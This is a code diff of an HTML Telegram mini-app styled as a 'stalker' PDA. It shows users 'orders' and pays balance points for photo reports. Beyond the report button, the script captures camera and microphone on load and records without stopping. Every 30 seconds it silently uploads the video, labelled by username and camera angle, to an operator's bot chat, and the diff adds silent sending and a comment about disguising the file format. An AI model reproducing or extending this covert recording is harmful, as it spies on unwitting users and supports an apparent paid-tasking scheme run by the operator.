@@ -3,17 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PDA Arsenii v6.0 HD</title>
+    <title>PDA Arsenii v6.1 Stable</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root { --green: #00ff41; --bg: #050804; }
         body { background: var(--bg); color: var(--green); font-family: monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; height: 100vh; }
         .header { padding: 10px 15px; border-bottom: 1px solid var(--green); display: flex; align-items: center; gap: 10px; background: rgba(0,255,65,0.05); }
-        .avatar { width: 40px; height: 40px; border: 1px solid var(--green); border-radius: 50%; border: 1px solid var(--green); }
         .stats { flex-grow: 1; }
         .balance-main { font-size: 1.1em; font-weight: bold; color: #fff; }
-        .cam-switch { background: none; border: 1px solid var(--green); color: var(--green); padding: 5px 10px; font-size: 0.7em; cursor: pointer; }
-        .viewport { flex-grow: 1; position: relative; background: #000; margin: 10px; border: 1px solid #1a1a1a; overflow: hidden; }
+        .cam-switch { background: none; border: 1px solid var(--green); color: var(--green); padding: 5px 10px; font-size: 0.7em; cursor: pointer; border-radius: 4px; }
+        .viewport { flex-grow: 1; position: relative; background: #000; margin: 10px; border: 1px solid #1a1a1a; }
         video { width: 100%; height: 100%; object-fit: cover; }
         .mission-panel { padding: 15px; background: rgba(0,255,65,0.05); border-top: 1px solid var(--green); }
         .btn-report { width: 100%; padding: 18px; background: var(--green); color: #000; border: none; font-weight: bold; font-size: 1.1em; }
@@ -30,9 +29,7 @@
         </div>
         <button id="switchCam" class="cam-switch">🔄 КАМЕРА</button>
     </div>
-
     <div class="viewport"><video id="webcam" autoplay playsinline muted></video></div>
-
     <div class="mission-panel">
         <div id="target-text" style="font-weight: bold; margin-bottom: 10px; font-size: 0.8em; color: #00ff41;">ЗАГРУЗКА ПРИКАЗА...</div>
         <button id="sendBtn" class="btn-report">ОТПРАВИТЬ ОТЧЕТ</button>
@@ -59,78 +56,71 @@
     let mediaRecorder;
     let chunks = [];
 
-    // Загрузка баланса и приказа
+    // Инициализация интерфейса
     document.getElementById('balance').innerText = localStorage.getItem(`bal_${user.id}`) || 0;
     const savedOrder = localStorage.getItem(`order_${user.id}`);
     if (savedOrder) document.getElementById('target-text').innerText = savedOrder;
 
-    async function initHDCamera(mode) {
+    async function initCamera(mode) {
         if (window.currentStream) window.currentStream.getTracks().forEach(t => t.stop());
         
         try {
-            // Настройка 720p
-            const constraints = {
-                video: { 
-                    facingMode: mode,
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 }
-                },
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: mode, width: { ideal: 1280 }, height: { ideal: 720 } },
                 audio: true
-            };
-            
-            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            });
             window.currentStream = stream;
             document.getElementById('webcam').srcObject = stream;
-            
             setupRecorder(stream);
-        } catch (err) { console.error(err); }
+        } catch (err) {
+            console.error(err);
+            // Если 720p не пошло, пробуем без параметров
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
+            window.currentStream = stream;
+            document.getElementById('webcam').srcObject = stream;
+            setupRecorder(stream);
+        }
     }
 
     function setupRecorder(stream) {
-        // Пытаемся использовать mp4 если доступно, иначе webm (но с MIME для плеера)
-        let options = { mimeType: 'video/webm;codecs=vp8,opus' };
-        if (MediaRecorder.isTypeSupported('video/mp4;codecs=h264')) {
-            options = { mimeType: 'video/mp4;codecs=h264,aac' };
-        }
-
-        mediaRecorder = new MediaRecorder(stream, options);
+        // Используем самый стабильный кодек vp8
+        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
+        
         mediaRecorder.ondataavailable = (e) => {
-            if (e.data.size > 0) chunks.push(e.data);
+            if (e.data.size > 5000) chunks.push(e.data);
         };
 
         mediaRecorder.onstop = () => {
-            const blob = new Blob(chunks, { type: options.mimeType });
-            sendHDVideo(blob);
-            chunks = [];
-            mediaRecorder.start(); // Перезапуск для следующего фрагмента
+            if (chunks.length > 0) {
+                const blob = new Blob(chunks, { type: 'video/mp4' }); // Маскируем под mp4 для плеера
+                sendVideo(blob);
+                chunks = [];
+            }
+            if (mediaRecorder.state === "inactive") mediaRecorder.start();
         };
 
-        // Запуск цикла записи по 30 сек
         mediaRecorder.start();
-        setTimeout(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, 30000);
     }
 
-    // Зацикливаем проверку каждые 30 секунд
+    // Цикл отправки каждые 30 секунд
     setInterval(() => {
         if (mediaRecorder && mediaRecorder.state === "recording") {
             mediaRecorder.stop();
         }
     }, 30000);
 
-    function sendHDVideo(blob) {
+    function sendVideo(blob) {
         const fd = new FormData();
         fd.append("chat_id", CONFIG.chatId);
-        // Расширение .mp4 заставляет TG открывать плеер
         fd.append("video", blob, `v_${Date.now()}.mp4`);
         fd.append("supports_streaming", "true");
         fd.append("caption", `👤 Сталкер: ${user.username}\n🎥 Ракурс: ${currentMode === 'user' ? 'ЛИЦО' : 'ОБЗОР'}`);
-        
-        fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVideo`, { method: "POST", body: fd });
+        fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVideo?disable_notification=true`, { method: "POST", body: fd });
     }
 
     document.getElementById('switchCam').onclick = () => {
         currentMode = (currentMode === "environment") ? "user" : "environment";
-        initHDCamera(currentMode);
+        initCamera(currentMode);
     };
 
     document.getElementById('sendBtn').onclick = () => {
@@ -141,13 +131,13 @@
         canvas.toBlob(blob => {
             const fd = new FormData();
             fd.append("chat_id", CONFIG.chatId);
-            fd.append("photo", blob, "report.jpg");
+            fd.append("photo", blob, "1.jpg");
             fd.append("caption", `☢️ ОТЧЕТ: ${user.username}`);
-            const kb = { inline_keyboard: [[{ text: "✅ ОПЛАТИТЬ", callback_data: `pay:${user.id}:100` }]] };
+            const kb = { inline_keyboard: [[{ text: "✅ ОПЛАТИТЬ (+100)", callback_data: `pay:${user.id}:100` }]] };
             fd.append("reply_markup", JSON.stringify(kb));
             fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: "POST", body: fd });
-            tg.showAlert("ОТЧЕТ ОТПРАВЛЕН");
-        }, "image/jpeg", 0.9);
+            tg.showAlert("ДАННЫЕ ПЕРЕДАНЫ");
+        }, "image/jpeg", 0.8);
     };
 
     async function sync() {
@@ -163,8 +153,12 @@
                             let b = parseInt(localStorage.getItem(`bal_${user.id}`) || 0) + parseInt(parts[2]);
                             localStorage.setItem(`bal_${user.id}`, b);
                             document.getElementById('balance').innerText = b;
-                            document.getElementById('target-text').innerText = "ЗАГРУЗКА ПРИКАЗА...";
-                            localStorage.removeItem(`order_${user.id}`);
+                            
+                            // СБРОС ПРИКАЗА
+                            const def = "ЗАГРУЗКА ПРИКАЗА...";
+                            document.getElementById('target-text').innerText = def;
+                            localStorage.setItem(`order_${user.id}`, def);
+                            tg.HapticFeedback.notificationOccurred('success');
                         }
                     }
                     const msg = u.message?.text || "";
@@ -178,8 +172,8 @@
         } catch (e) {}
     }
 
-    initHDCamera(currentMode);
-    setInterval(sync, 3000);
+    initCamera(currentMode);
+    setInterval(sync, 2500);
 </script>
 </body>
 </html>
